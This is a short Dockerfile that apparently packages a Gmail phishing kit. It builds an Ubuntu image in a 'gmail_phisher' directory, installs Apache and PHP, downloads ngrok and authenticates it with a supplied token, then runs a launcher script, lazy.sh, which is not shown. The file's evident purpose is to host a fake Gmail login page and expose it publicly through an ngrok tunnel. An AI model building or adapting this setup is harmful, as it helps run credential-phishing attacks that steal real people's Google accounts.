FROM ubuntu:xenial

ARG NGROK_TOKEN

ENV LC_ALL=C.UTF-8

WORKDIR /home/gmail_phisher

COPY . .

RUN apt update \
  && apt install --yes jq curl wget unzip software-properties-common \
  && add-apt-repository --yes ppa:ondrej/php \
  && apt update \
  && apt install --yes apache2 php libapache2-mod-php \
  && a2enmod php7.0

RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip \
  && unzip ngrok-stable-linux-386.zip \
  && mv ngrok /usr/bin/ngrok \
  && ngrok authtoken "${NGROK_TOKEN}"

RUN chmod +x lazy.sh

CMD ./lazy.sh
